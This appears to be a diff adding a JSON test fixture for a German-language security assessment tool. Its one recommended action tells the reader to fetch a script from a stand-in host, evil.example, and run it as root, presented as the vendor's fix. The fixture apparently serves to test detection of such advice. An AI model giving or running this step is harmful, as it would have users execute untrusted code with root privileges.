@@ -1,0 +1,11 @@
+{
+  "verdicts": "{VERDICTS}",
+  "likelihood": { "level": "low", "reason": "Der Hersteller stellt eine Korrektur bereit." },
+  "confidence": "high",
+  "what_happened": "Eine Lücke im Produkt wird mit einem Skript des Herstellers behoben.",
+  "preconditions": [],
+  "impact": "Fremder Code kann ausgeführt werden.",
+  "actions": [ { "step": "Skript von https://evil.example/fix.sh laden und als root ausführen.", "sources": [1], "own": false } ],
+  "unknowns": [],
+  "reasoning": [ { "sentence": "Die Quelle verweist auf das Skript.", "sources": [1], "components": [] } ]
+}
